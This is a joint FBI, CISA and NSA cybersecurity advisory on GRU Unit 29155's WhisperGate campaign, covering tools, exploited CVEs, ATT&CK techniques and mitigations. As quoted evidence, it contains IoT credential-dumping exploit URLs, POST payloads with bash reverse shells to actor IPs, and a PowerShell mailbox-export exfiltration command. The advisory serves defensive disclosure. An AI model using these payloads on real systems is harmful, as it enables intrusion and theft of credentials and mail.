GRU Unit 29155  cyber actors  began deploying the destructive WhisperGate  malware \nagainst multiple Ukrainian victim organizations  as early as January 13, 2022 . These cyber actors are \nseparate from other known and more established GRU -affiliated cyber groups , such as Unit 26165 and \nUnit 74455 . \nTo mitigate this malicious cyber activity, organizations should take the following actions today:  \n Prioritize routine system updates and remediate known exploited vulnerabilities.  \n Segment networks to prevent the spread of malicious activity.  \n Enable phishing -resistant multifactor authentication (MFA) for all externally facing acc ount services, \nespecially for webmail, virtual private networks (VPNs), and accounts that access critical systems.  \nThis Cybersecurity Advisory  provides tactics, techniques, and procedures (TTPs) associated with Unit \n29155 cyber actors both during and succe eding  their deployment of  WhisperGate against  Ukraine as \nwell as further analysis (see Appendix A ) of the WhisperGate malware  initially published in the joint \nadvisory , Destructive Malware Targeting Organizations in Ukraine , published February 26, 2022 . \n \n\n \n  FBI | CISA  | NSA  | et. al  TLP:CLEAR  \n \n \n \nPage 2 of 36  |  Product ID: AA2 4-249A \nTLP:CLEAR  \n FBI, CISA, NSA and the following partners are releasing this joint advisory  as a collective assessment of \nUnit 29155  cyber operations since 2020 : \n U.S. Department of the Treasury  \n U.S. Department of State (Rewards for \nJustice ) \n U.S. Cyber Command Cyber National \nMission Force  (CNMF)  \n Netherlands Defence Intelligence and \nSecurity Service (MIVD)  \n Czech Military Intelligence (VZ)  \n Czech Republic Security Information \nService (BIS)  \n German Federal Office for the Protection \nof the Constitution (BfV)  \n Estonian Internal Security Service (KAPO)   Latvian State Security Service (VDD)  \n Security Service of Ukraine (SBU)  \n Computer Emergency Response Team of \nUkraine (CERT -UA) \n Canadian Security Intelligence Service \n(CSIS)  \n Communications Security Establishment \nCanada (CSE)  \n Australian Signals Directorates \nAustralian Cyber Security Centre (ASDs \nACSC)  \n United Kingdom National Cyber Security \nCentre (NCSC -UK)\nFor additional information  on Russian state -sponsored malicious cyber activity  and related indictments , \nsee the recent  U.S. Department of Justice (DOJ) press release s for June 26, 2024  and September 5, 2024 , \nFBIs Cyber Crime  webpage,  and CISAs Russia Cyber Threat Overview and Advisories  webpage . \nFor a downl oadable copy of indicators of compromise (IOCs):  \n AA24 -249A.stix  (XML)  \n AA24 -249A.stix (JSON)  \nTechnical Details  \nNote:  This advisory uses the MITRE ATT&CK for Enterprise  framework, version 1 5. See the MITRE ATT&CK \nTactics and Techniques  section for a table of the threat actors activity mapped to MITRE ATT&CK tactics \nand techniques.  \nGRU Unit 291 55: Cyber Component  \nFBI, NSA, and CISA  assess Unit 29155  is responsible for attempted coups, sabotage and influence \noperations, and assassination attempts throughout Europe.  Unit 29155 expanded their tradecraft to \ninclude offensive cyber operations  since at least 2020. Unit 29155 cyber actors objectives appear to \ninclude the collection of information for espionage purposes, reputational harm caused by the theft and \nleakage of sensitive information, and systematic sabotage caused by the destruction of data  [T1485 ]. \nFBI assess es the Unit 29155 cyber  actors  to be  junior active -duty GRU officers  under the direction of \nexperienced  Unit 29155 leadership . These individuals appear to be gain ing cyber experience and \nenhanc ing their technical skills  through conducting cyber operations and intrusions . Additionally, FBI \nassesses  Unit 29155 cyber actors rely on non -GRU actors , including known cyber -criminals  and enablers  to \nconduct  their operations.  \n\n \n  Page 3 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n Cybersecurity Industry Tracking  \nThe cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation \nrecommendations  related to Unit 29155 cyber actors. While  not all  encompassing, the following  are the \nmost notable  threat group names related under MITRE ATT&CK G1003  and commonly used within the \ncybersecurity community . \n Cadet Blizzard (formerly known as DEV -0586  by Microsoft )[1],[2] \n Ember Bear  (also known as Bleeding Bear  by CrowdStrike) [3] \n Frozen vista  \n UNC2589 [4] \n UAC-0056 [5] \nNote:  Cybersecurity companies have different methods of tracking and attributing cyber actors, and this \nmay not be a 1:1 correlation to the U.S. Governments understanding for all activity related  to these \ngroupings.  \nVictimization  \nIn addition to WhisperGate and  other incidents against  Ukraine, Unit 29155 cyber actors have conducted \ncomputer network operations against numerous member s of the North Atlantic Treaty Organization  (NATO ) \nin Europe and North America, as well as countries in Europe, Latin America , and Central Asia. The activity \nincludes cyber campaigns  such as website defacements , infrastructure scanning, data exfiltration , and \ndata leak operations . These actors sell or publicly release exfiltrated victim data obtained from their \ncompromises.  Since  early 2022, the primary focus of the cyber actors appears to be targeting and \ndisrupting efforts to provide aid to Ukraine.  \nTo date, the FBI has observed m ore than 14,000 instances of domain scanning across at least 26 NATO \nmembers and several additional European Union ( EU) countries.  Unit 29155 cyber actors have defac ed \nvictim websites and us ed public website domains to post exfiltrated victim information.   \nWhether through offensive operations or scanning activity, Unit 29155 cyber actors are known to target \ncritical infrastructure and key resource sectors, includ ing the government  services , financial  services , \ntransportation  systems , energy, and healthcare sectors of NATO  members , the EU, Central America n, and \nAsian  countries.  \nTTP Overview  \nReconnaissance  \nUnit 29155 cyber actors  have been observed  targeting IP range s [T1595.001 ] used within  multiple \ngovernment and critical infrastructure organizations . The following are  publicly ava ilable tools these cyber \nactors have used for scanning [T1595 ] and vulnerability exploit efforts. Unit 29155 cyber actors were not \nobserved using these tools outside of their intended purpose. Note: Use of these tools should not be \nattributed as malicious without analytical evidence to support threat actor use and/or control . \n Acunetix : Unit 29155 cyber actors leveraged both Acunetix and Nmap  to identify open ports, \nservices, and vulnera bilities for networks  [T1595.002 ].[6] \n\n \n  Page 4 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n  Amass : Unit 29155 cyber actors leveraged both Amass and VirusTotal  to obtain subdomains for \ntarget websites  [T1590.002 ].[7] \n Droopescan [8] \n JoomScan [9] \n MASSCAN : Unit 29155 cyber  actors used  MASSCAN and Nmap to discover other machines once \ninside  victim network s.[10] \n Netcat [11] \n Nmap : Once Unit 29155 cyber actors gained access to victim internal networks, they further used \nNmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning \nother machines [ T1046 ]. \n Shodan : Unit 29155 cyber actors used Shodan to  identify hosts with a specific set of vulnerab ilities \nor device type s [T1596.005 ].[12] \n VirusTotal [13] \n WPScan  \nAdditionally, Unit 29155  cyber actors have used i nfrastructure configured with OpenVPN configuration \n[T1572 ] over port 1194 , and in some instances,  to perform Active Directory (AD) enumeration . Adminer  in \ncombination with Impacket  and ldapdomaindump  were tools used for gathering information on AD.  Once \nactive devices are found, Unit 29155 cyber actor s look for vulnerabilities to exploit.  For example, t he \nAcunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities  \nsuch as  blind cross -site scripting , as shown in the following commands:  \nGET /index.php?log=to@example.com>%0d%0abcc:009247.3183 -\n377.3183.1bf6c.19446.2@bxss.me  \n\"GET /CMS/files/log.htm HTTP/1.1\" * * \"(nslookup hitccruvbrumn76c1b.bxss.me||perl \n-e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me') \\\")\" \nAs the cyber actors perform reconnaiss ance on victim networks and discover vulnerabilities within victim \nweb servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against \nvictim infrastructure [ T1588.005 ]. Unit 29155 cyber actors  have been observed obtaining  the respective \nexploit scripts for , but not exploiting , the following CVEs:  \n CVE-2020 -1472  (Microsoft : Windows Server)  \n CVE-2021 -26084  (Atlassian Confluence  Server and Data Center ) \n CVE-2021 -3156  (Red Hat:  Privilege Escalation via Command Line Argument Parsing ) \n CVE-2021 -4034  (Red Hat: Polkit Privilege Escalation ) \n CVE-2022 -27666  (Red Hat: Heap Buffer Overflow Flaw) \nAnalysis concluded  Unit 29155 cyber actors have exploited the following CVEs  for initial access [T1190 ], as \ndetailed throughout this advisory : \n CVE-2021 -33044  (Dahua Security)  \n CVE-2021 -33045  (Dahua Security)  \n\n \n  Page 5 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n  CVE-2022 -26134  (Atlassian  Confluence Server and Data Center)  \n CVE-2022 -26138  (Atlassian Confluence Server and Data Center)  \n CVE-2022 -3236  (Sophos: Firewall)  \nResource Development  \nRather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and \npublicly  available tools to conduct  cyber operations. As a result, many  TTPs overlap with those of other \ncyber actors, which can lead  to misattribution.  \nUnit 29155  actors and their cyber -criminal affiliates commonly  maintain accounts on dark web forums ; this \nhas provided the opportunity to obtain various hacker tools such as malware and malware loaders  \n[T1588.001 ] like Raspberry Robin and SaintBot . While Unit 29155 cyber actors are best known for their \nuse of WhisperGate malware against  Ukraine, the use of WhisperGate is not unique to the group.  Technical \nanalysis can be found in Appendix A: WhisperGate Malware Analysis . \nInitial Access  \nUnit 29155 cyber actors are known to use VPNs to anonymize their operational activity . These cyber actors  \ncommonly attempt to exploit weaknesses in internet -facing  systems , like the CVEs  listed above,  to initially \naccess networks.  In one instance, Unit 29155 cyber actors exploited CVE-2021 -33044 and CVE -2021 -\n33045 on Dahua IP cameras to bypass identity authentication . \nLateral Movement  \nUnit 29155 cyber actors have us ed Shodan to scan for Internet of Things (IoT) devices , using exploitation \nscripts to authenticate to IP cameras with default usernames  and passwords  [T1078.001 ], and exfiltrat ing \nimages  [T1125 ] (JPG files) . Attempts  are then made  to perform remote command execution via web to \nvulnerable IP cameras ; if successful, cyber actors would dump configuration settings and credentials in \nplaintext  (as shown in Table 1 below ) [T1552.001 ]. \nAppendix B: Indicators of Compromise  lists threat actor IP addresses associated with the activity detailed in \nthis section.  \nTable 1: IoT Exploitation Events  \nNote:  These events are  independent and not correlated as a single  timeline of compromise.  \nEvent  Victim Observation  \nWeb requests \nobserved from victim \ninfrastructure  These requests are likely intended to dump configuration settings and credentials  \n[T1003 ]: \nhxxp://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password=\n%3becho%20%22%3c%21 --%23include%20file=%22SYS_CFG%22 --\n%3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1&\nsecret=1&key=PWNED  \nhxxp://<IP>:<port>/ssi.cgi/tmp/Login.htm  \n\n \n  Page 6 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n Event  Victim Observation  \nPOST requests sent to \nvictims  with payloads  \n[T1071.001 ] \"txtUser=lol&txtPassword=2&btConnect=Piesl%C4%93gtiesbtConnect=P\niesl%C4%93gties&chRemember=on&txtPassword=g00dPa%24%24w0rD&txtUs\ner=$%7b@print(s ystem(%22bash%20 -\ni%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))\n%7d\" \n\"txtUser=lol&txtPassword=2&btConnect=Piesl%C4%93gtiesbtConnec\nt=Piesl%C4%93gties&chRemember=on&txtPassword=g00dPa%24%24w0rD\n&txtUser=$%7b@print(system(%22bash%20 -\ni%20%3E%26 %20%2Fdev%2Ftcp%2F81.17.24.130%2F6870%200%3E%261%22\n))%7d\"  \nURL encoded values \nfrom txtUser for both \ncommands decoded \nto embedded bash \ncommands  ${@print(system(\"bash -i >& /dev/tcp/179.43.175.38/6870 0>&1\"))}  \n${@print(system(\"bash -i >& /dev/tcp /81.17.24.130/6870 \n0>&1\"))}  \nIn addition,  incident analysis identified t he general observations  listed below  on victim infrastructure.  Each \nevent should be considered  independent and may have been used by Unit 29155 cyber actors  against  \nmultiple victims at different dates and timeframe s. Appendix B: Indicators of Compromise  lists IOCs \nassociated with the observations in Table 1 and below . \n In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors \nexfiltrated data to mega[.]nz  using Rclone  [T1567.002 ]. \n Unit 29155 c yber a ctors used a Pass -the-Hash [T1550.002 ] via ProxyChains . \n Cyber a ctors performed SSH and SSHPass executions.  \n Cyber actors initiated a web request and executed commands via ProxyChains. This included \nobtaining NT hashes via Server Message Block (SMB) using smbclient , executing Windows \nManagement Instrumentation (WMI) with hashes, and making web requests with resources i.php  \nand tunnel.jsp . In one instance, cyber actors used smbclient via ProxyChains to access inter nal \nnetwork shares, and subsequently PSQL and MySQL clients to access internal databases.   \n Cyber actors u sed Impacket for post -exploitation and lateral movement. The script \nsecretsdump.py  was used from  the Impacket framework to obtain domain credentials , while \npsexec.py  was subsequently used to move laterally within a victim  network.   \n Cyber actors used ntlmrelayx.py  via Impacket and krbrelayx.py , which re quires Impacket  to \nfunction . \n Cyber actors used Responder.py . \n Cyber actors used su-bruteforce  to brute force a selected user using the su command.  \n\n \n  Page 7 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n  Cyber actors used Blood Hound , an open source AD reconnaissance tool that can reveal hidden \nrelationships and identify attack paths within an AD env ironment . \n Cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal  victim  IP \naddresses.  This open source post -exploitation tool automates assessing the security of large AD \nnetworks . \n Cyber actors used LinPEAS , an open source scri pt designed to automate the process of searching \nfor potential privilege escalation vulnerabilities on a  Linux victim . \n Cyber actors used GO Simple Tunnel ( GOST ) (MD5: 896e0f54fc67d72d94b40d7885f10c51 ) for \n30 days  within one incident  and against  additional victims  on various occasions . GOST  is a \ntunnel ing tool designed to establish secure connections between clients and servers, allowing for \nsecure  data transmission over untrusted networks . \n Cyber a ctors used Through the Wire against  a victims internet -facing  Confluence server . Through \nthe Wire is a proof of concept[ 14] exploit for CVE -2022 -26134, a n OGNL injection vulnerability \nallowing an unauthenticated user to execute  arbitrary code on a Confluence Server or Data Center \ninstance. All versions of Confluence Server and Data Center prior to the fixed versions listed by \nAtlassian are affected by this vulnerability.[ 15] A reverse shell  over HTTPS was used to \ncommunicate over listening host on port 8081 . \n Cyber actors initiated Nmap scans on localized web servers.  \n Cyber actors performed lateral movement from compromised  web servers to exploit a corporate \nMicrosoft Windows network , commonly  using psexec.py  from the Impacket framework . The script \nsecretsdump.py  from the Impacket framework was used to obtain domain credentials.  \n Cyber actors may have used Raspberry Robin  malware in the role of an access broker [ T1588.001 ]. \n Cyber actors targeted  victims Microsoft Outlook Web Access (OWA) infrastructure with password \nspraying  to obtain valid userna mes and passwords  [T1110.003 ]. \nCommand and Control  \nInfrastructure  \nSince at least 2020, Unit 29155 cyber actors have used virtual private servers ( VPSs ) [T1583.003 ] to host \ntheir operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data.  Use \nof VPSs are common due to the associated IP addresses  not identifying their true country of origin.  \nPost -Exploitation  \nWhen an exploit is successfully executed on a victim system, the actors  can then launch a Meterpreter \npayload  [T1105 ], which commonly uses a reverse Transmission Control Protocol (TCP) connection to \ninitiate communication with the threat actors infrastructure  [T1095 ]. In one instance, an established  \nreverse TCP session  was observed from victim to actor infrastructure via the following  ports : \n 1234  \n 1851  \n 43221  \n 443  4444  \n 4688  \n 5432  \n 8080   8081  \n 8082  \n 8084  \n 8085  \n\n \n  Page 8 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n  8088  \n 8089   8090  \n 8443   8487  \n 8888  \nAdditional  observations were  collected from victim engagement and analysis, includ ing: \n Use of  the Metasploit Framework to search for and/or access modules such as mysql , postgres , \nand ssh software  and features . \n Use of Meterpreter and Netcat to execute reverse shells over ports such as 8081 . \n Use of Impacket . \n Use of PHP (exp_door v1.0.2 , b374k , WSO 4.0.5 ) and the P.A.S.  web shells  [T1505.003 ], likely \nfor initial access.  \n Use of EternalBlue .[16],[17] \n Use of reGeorg or Neo -reGeorg to set up a proxy to tunnel network traffic  following compromise of a \nvictim website , as well as use of  ProxyChains to run Nmap within the network.  \nEncrypted Communication  \nOnce Unit 29155 cyber actors gain access to the victims internal network, the  victims have  observed : \n1. Using Domain Name System (DNS)  tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 \nnetwork traffic  [T1071.004 ]. For e xample , Iodine was used to tunnel data via \ndns.test658324901domain.me . \n2. Configuring a proxy within the victim infrastructure and execut ing commands within the network via \nProxyChains.  ProxyChains a tool used to route internal traffic through a series of proxies  \n[T1090.003 ]has been used to provide further anon ymity and modify system configuration to force \nnetwork traffic through chains of SOCKS5 proxies and respective ports . The f ollowing ports  used by  \nactor infrastructure include:  \na. 1080  \nb. 1333  \nc. 13381  \nd. 13391  \ne. 13666  \nf. 13871  \ng. 1448  \nh. 1888  \ni. 3130  \nj. 3140  \nk. 4337  \nl. 50001  \nm. 8079  \n\n \n  Page 9 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n 3.

These cyber  actors commonly use the command -line program Rclone to exfiltrate  data to a \nremote location from victim infrastructure.  \nUnit 29155 cyber actors have exfiltrated Windows processes and artifacts , such as Local Security Authority \nSubsystem S ervice  (LSASS ) memory dumps  [T1003.001 ], Security Accounts Manager  (SAM ) files \n[T1003.002 ], and SECURITY  and SYSTEM  event log files  [T1654 ]. As seen in victim incident response \nresults , actor infrastructure  has also been used  to compromise multiple mail servers  [T1114 ] and exfiltrate \nmail artifacts , such as email  message s, using PowerShell [T1059.001 ] via the following command : \npowershell New -MailboxExportRequest  Mailbox <resource>  FilePath ` \\\\{IP \nAddress} \\sharefolder \\1.pst` \nMITRE ATT&CK Tactics and Techniques  \nSee Table 3 to Table 4 for all referenced threat  actor tactics and techniques in this advisory .

Where necessary  services must be exposed , such as services \nhosted in a demilitarized zone (DMZ ), implement the appropriate compensat ory controls to prevent \ncommon forms of abuse and exploitation. Disable a ll unnecessary operating system  applications  \nand network protocols to combat  adversary enumeration.  For additional guidance, see CISA \nInsights: Remediate Vulnerabilities for Internet -Accessible Systems . \n U.S. organizations can utilize a range of CISA services at no cost, including vulnerability scanning \nand testing, to help organizations reduce exposure to  threats.

This publication provi des an overview  of software supply \nchain risks and recommendations for how software customers and vendors can use the NIST Cyber \nSupply Chain Risk Management (C -SCRM) Framework and the Secure Software Development \nFramework (SSDF) to identify, assess, and m itigate software supply chain risks.  CISA recommends \ncomprehensive  mitigations for  supply chain incident reporting, vulnerability disclos ing (e.g., \nsecurity.txt) , and choosing a trusted supplier or vendor that observes proper cyber security hygiene \n(CISA CPG 1.G , 1.H, 1.I) to defend against upstream attack s. \nDeploy Protective Controls and Architecture  \n Implement network segmentation . Network segmentation can help prevent lateral movement by \ncontrolling traffic flows between and access to various subnetworks  (CISA CPG 2.F ). Best pract ice \nmitigations include updat ing Identity and Access Management (IAM)  and employing phishing -\nresistant MFA for all devices and accounts identified as organizational assets . For additional \nguidance, s ee CISA and NSAs  IAM Recommended Best Practices Guide for Administrators  (CISA \nCPGs 2.H ). \n Verify and ensure that  sensitive data, including credentials, are not stored in plaintext and can only \nbe accessed by authenticated and authorized users.  Credentials must be stored in a secure \nmanner, such as with a credential/password manager to protect from malicious enumeration ( CISA \nCPG 2.L). \n\n \n  Page 16 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n  Disabl e and/or restrict us e of command  line and PowerShell  activit y. Update to the latest version \nand uninstall all earlier PowerShell versions (CISA CPG 2.N ). \n Implement  a continuous system monitoring program, such as security information and event \nmanagement (SIEM ) or endpoint detection and response ( EDR) solution s, to comprehensively log \nand review all authorized external access connections . This logging will better ensure the prompt \ndetection of misuse or abnormal  activity ( CISA CPG 2.T ). \n Monitor for unauthorized access attempts and programming anomalies  through comprehensive \nlogging that is secured from modification , such as limiting permissions and adding redundant \nremote logging ( CISA CPG 2.U ). Security appliances should be set to detect and/or block Impacket \nframe work indicators, PSExec or WMI commands, and suspicious PowerShell command s for timely \nidentification and remediation.  \n Identify any use of outdated or weak encryption,  update these to sufficiently strong  algorithms, and \nconsider the implications of post -quantum cryptography  (CISA CPG 2.K ). Use properly configured \nand up -to-date Secure Socket Layer (SSL)/ Transport Layer Security (TLS) to  protect data in transit.  \nSecurity Controls  \nIn addition to applying mitigations, the authoring agencies  recommend exercising, testing, and validating \nyour organization's security program against the threat behaviors mapped to the MITRE ATT&CK for \nEnterprise  framework in this advisory. The authoring agencies  recommend  testing your existing security \ncontrols inventory to assess how they perform against the ATT&CK techniques described in this advisory.  \nTo get started:  \n1. Select  an ATT&CK technique described  in thi s advisory  (see Table 3 to Table 4). \n2. Align your security technologies against the technique.  \n3. Test your technologies against the technique.  \n4. Analyze your detection and prevention technologies  performance.  \n5. Repeat the process for  all security technologies to obtain a set of comprehensive performance \ndata.  \n6. Tune your security program, including people, processes, and technologies, based on the data \ngenerated by this process.  \nThe authoring agencies  recommend  continually testing your security program, at scale, in a production \nenvironment to ensure optimal performance against the MITRE ATT&CK techniques identified in this \nadvisory.  \nResources  \n MITRE: WhisperGate  \n CISA AA22 -057A: Destructive Malware Targeting Organizations in Ukraine  \n\n \n  Page 17 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n  DOJ Press Release: Russian National Charged for Conspiring with Russian Military Intelligence to \nDestroy Ukrainian Government Computer Systems and Data  \n FBI: Cyber Crime  \n CISA: Russia Cyber Threat Overview and Advisories  \n MITRE: Group G1003 - Ember Bear  \n MITRE: Impacket  \n NIST NVD: CVE -2020 -1472  \n NIST NVD: CVE -2021 -26084  \n NIST NVD: CVE -2021 -3156  \n NIST NVD: CVE -2021 -4034  \n NIST NVD: CVE -2022 -27666  \n NIST NVD: CVE -2021 -33044  \n NIST NVD: CVE -2021 -33045  \n NIST NVD:  CVE-2022 -26134  \n NIST NVD: CVE -2022 -26138  \n NIST NVD: CVE -2022 -3236  \n MITRE: BloodHound  \n MITRE: Rclone  \n MITRE: P.A.S.

The analysis  provides insight into Unit 29155 cyber actor infrastructure used \nfor network scanning, password compromising, and data exfiltration against Ukraine, NATO  member s in \nEurope and North America, and countries in Latin America and Central Asia . \nUnit 29155 cyber actors use of WhisperGate involved the deployment of the malware files, stage1.exe  \nand stage2.exe . WhisperGate has two stages that corrupts a systems master boot record, displays a \nfake ransomware note, and encrypts files based on certai n file extensions  (see AA22 -057A ). The actors \nused multiple Discord accounts to store malware files, including what appears to be development versions \nor iterations of the binaries. Discord is commonly leveraged by threat actors as an endpoint for malware \ndistribution and control; in this case, it was used to obtain the next step of the infection chain by directly \nsharing files through its platform. In the case of stage2.exe , the binary communicated with Discord to \nobtain Tbopbh.jpg the malicious payload that is in -memory loaded and performs  the destructive \ncapabilities .[18] \nCategorization  \nThe Discord accounts associated with the WhisperGate campaign are categorized into three main clusters, \nlabeled below as Clusters 1, 2, and 3. All clusters used Discord as a staging environment for malware \ndeployment. These groupings are ba sed on analysis of threat actor IP addresses and the nature of the \nmalware that existed within the accounts. The following sections include notable details found within each \ncluster.  \nCluster 1  \nCluster 1 contained the following files:  \n hxxps://cdn.discordapp[.]com/attachments/928503440139771947/9301086376811847\n68/Tbopbh.jpg  (a resource , e.g., payload,  for stage2.exe )[18] \n saint.exe  (a downloader, SaintBot , as detailed by CERT -UA)[19] \n puttyjejfrwu.exe [19] \nCluster 2  \nCluster 2 contained : \n hxxps://cdn.discordapp[.]com/attachments/888408190625128 461/8956339522477998\n58/n.lashevychdirekcy.atom.gov.ua.zip  (means for sending malware  in over  35 different \nzip files via Discord links )[20] \n Several Microsoft W ord documents with macros that  download test01.exe  from  3237.site . \nOnce executed, test01.exe  downloads load2022.exe  from  smm2021.net . \n\n \n  Page 20 of 36  |  Product ID: AA2 4-249A FBI | CISA | NSA  | et. al  TLP:CLEAR  \n \n \nTLP:CLEAR  \n Cluster 3  \nCluster 3 contained : \n hxxps://cdn.discordapp[.]com/attachments/945968593030496269/9459704461495091\n30/Client.exe  (Note: Unit 29155 cyber actors use of Client.exe  was confirmed as linked to \nthe activity, but the file was not obtained for analysis and functionality cannot be confirmed. )  \n asd.exe  (likely a development version of stage1.exe ) \nBehavioral Analysis  \nTwo Windows Portable Executable (PE) files ( stage1.exe  and stage2.exe ) were obtained from the \nUkrainian victim for analysis.
